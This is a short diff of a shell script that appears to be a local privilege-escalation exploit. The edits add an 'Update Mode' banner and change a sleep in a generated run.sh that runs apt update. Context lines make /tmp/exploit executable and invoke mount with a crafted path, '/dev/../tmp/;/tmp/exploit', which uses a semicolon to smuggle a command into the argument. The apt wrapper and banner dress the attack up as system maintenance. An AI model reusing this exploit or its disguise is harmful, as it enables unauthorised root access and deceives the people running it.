@@ -21,6 +21,9 @@ then
     UPurple='\033[4;35m'      # Purple
     UCyan='\033[4;36m'        # Cyan
     UWhite='\033[4;37m'       # White
+    echo -e "[!] Entering $UPurple Update Mode.. $NC "
+    sleep 1
+    clear
     echo -e "$Yellow
     __/\\\________/\\\_________________________/\\\________________________________________________________________________/\\\_________        
     _\/\\\_______\/\\\________________________\/\\\_______________________________________________________________________\/\\\_________       
@@ -49,7 +52,7 @@ then
     chmod a+x /tmp/exploit
     touch run.sh
     chmod +x run.sh
-    echo "apt update ; apt upgrade > /tmp/fish.txt ; sleep 1 ; rm /tmp/fish.txt " >> run.sh
+    echo "apt update ; apt upgrade > /tmp/fish.txt ; sleep 3 ; rm /tmp/fish.txt " >> run.sh
     echo "[+] Enter the command './run.sh' : "
     ${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
     )
